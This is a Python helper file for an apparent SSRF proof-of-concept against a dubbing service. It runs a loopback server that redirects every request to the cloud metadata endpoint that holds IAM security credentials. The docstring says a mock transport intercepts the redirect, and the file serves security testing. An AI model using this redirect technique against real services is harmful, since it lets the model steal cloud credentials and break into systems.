"""
Stand-alone redirect server for the SSRF PoC.

This is only used by the PoC script and is NOT imported by the dubbing
service. It binds to 127.0.0.1:9999 and on `/` returns:

    302 Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/

It binds to a loopback address only so it cannot be reached from outside
this sandbox. We don't actually let any request reach 169.254.169.254;
the test client uses a httpx MockTransport to intercept the redirect.
"""
import http.server
import socketserver
import threading
import sys

REDIRECT_TO = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"


class RedirectHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header("Location", REDIRECT_TO)
        self.send_header("Content-Length", "0")
        self.end_headers()

    def do_POST(self):
        self.do_GET()

    def log_message(self, format, *args):
        sys.stderr.write("[redirect-server] " + (format % args) + "\n")


def start_redirect_server(host="127.0.0.1", port=9999):
    httpd = socketserver.TCPServer((host, port), RedirectHandler)
    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()
    return httpd


if __name__ == "__main__":
    httpd = start_redirect_server()
    print("Redirect server up on http://127.0.0.1:9999/ ->", REDIRECT_TO)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        httpd.shutdown()
